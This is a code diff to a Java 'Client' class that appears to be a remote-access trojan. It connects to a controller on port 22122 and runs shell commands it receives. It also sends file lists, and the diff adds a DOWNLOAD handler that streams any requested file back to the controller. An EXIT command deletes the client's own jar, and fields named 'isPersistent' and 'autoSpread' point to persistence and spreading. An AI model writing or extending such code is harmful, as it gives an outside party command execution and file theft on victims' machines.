@@ -5,12 +5,12 @@ import java.net.Socket;
 import java.util.ArrayList;
 
 public class Client {
-    private static String HOST = "127.0.0.1";
+    private static String HOST = "localhost";
     private static int PORT = 22122;
+    private boolean isPersistent = false;
+    private boolean autoSpread = false;
     private BufferedOutputStream out;
     private Socket socket;
-    private boolean isPersstent = false;
-    private boolean autoSpread = false;
 
     private static String getHOST() {
         return HOST;
@@ -60,15 +60,18 @@ public class Client {
             while (in.readLine() != null) {
                 String comm = in.readLine();
                 if (comm.contains("CMD ")) {
-                    System.out.println(comm);
                     exec(comm.replace("CMD ", ""));
                 } else if (comm.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
-                } else if (comm.equals("forciblyclose")) {
-                    communicate("forciblyclose");
+                }else if (comm.contains("DOWNLOAD")) {
+                    communicate("DOWNLOAD");
+                    sendFile();
+                } else if (comm.equals("EXIT")) {
+                    communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
-                    f.delete();
+                    System.out.println(f.toString());
+                    f.deleteOnExit();
                     System.exit(0);
                 }
             }
@@ -155,6 +158,37 @@ public class Client {
                 dos.writeUTF(name);
             }
             dos.writeUTF("END");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void sendFile() {
+        try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
+             DataOutputStream dos = new DataOutputStream(bos);
+             BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());
+             DataInputStream dis = new DataInputStream(bis)) {
+            String fileName = dis.readUTF();
+            String saveLocation = dis.readUTF();
+
+            dos.writeUTF(saveLocation);
+
+            File filetoDownload = new File(fileName);
+            Long length = filetoDownload.length();
+            dos.writeLong(length);
+            dos.writeUTF(fileName);
+
+            FileInputStream fis = new FileInputStream(filetoDownload);
+            BufferedInputStream bs = new BufferedInputStream(fis);
+
+            int fbyte;
+            while((fbyte = bs.read()) != -1) {
+                bos.write(fbyte);
+
+            }
+            bs.close();
+            dos.close();
+
         } catch (IOException e) {
             e.printStackTrace();
         }
